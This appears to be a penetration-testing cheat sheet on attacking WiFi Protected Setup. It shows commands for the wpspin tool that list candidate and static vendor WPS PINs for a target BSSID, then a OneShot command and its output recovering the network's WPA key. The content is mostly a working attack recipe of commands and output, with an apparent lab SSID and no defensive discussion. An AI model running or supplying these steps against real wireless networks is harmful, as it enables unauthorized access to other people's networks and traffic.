# Wifi Protected Setup (WPS)

## [WPSPin}(https://github.com/drygdryg/wpspin.git)
Usage:
```bash
wpspin D4:BF:7F:EB:29:D2

Found 1 PIN(s)
PIN        Name
99956042   Static PIN — Onlime
```

`-A` will generate a list of potential pins for valid BSSID's
```bash
wpspin -A D4:BF:7F:EB:29:D2

Found 49 PIN(s)
PIN        Name
77215369   24-bit PIN
<SNIP>
12345670   Static PIN — Cisco
68175542   Static PIN — DSL-2740R
95661469   Static PIN — Realtek 1
95719115   Static PIN — Realtek 2
48563710   Static PIN — Realtek 3
20854836   Static PIN — Upvel
```

Once a valid pin is found, we can hit it with `Reaver` or `OneShot`:
```bash
python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p 99956042

[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '99956042'…
[*] [0] Scanning…
<SNIP>
[*] [-30] Received WPS Message M5
[+] The first half of the PIN is valid
[*] [-30] Sending WPS Message M6…
[*] [-30] Received WPS Message M7
[+] WPS PIN: '99956042'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackTheWireless'
```
